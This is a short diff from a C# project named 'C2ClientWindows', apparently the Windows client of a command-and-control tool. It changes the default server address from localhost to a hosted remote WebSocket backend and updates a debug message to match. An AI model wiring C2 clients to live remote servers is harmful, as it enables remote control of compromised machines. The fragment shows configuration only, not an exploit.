@@ -130,8 +130,8 @@ namespace C2ClientWindows
 
             if (string.IsNullOrEmpty(serverUrl))
             {
-                serverUrl = "ws://localhost:8080/ws";
-                Console.WriteLine("[DEBUG] Using default server URL: ws://localhost:8080/ws");
+                serverUrl = "wss://loopjs-backend-361659024403.us-central1.run.app/ws";
+                Console.WriteLine("[DEBUG] Using default server URL: wss://loopjs-backend-361659024403.us-central1.run.app/ws");
             }
 
             C2Endpoint = new Uri(serverUrl);
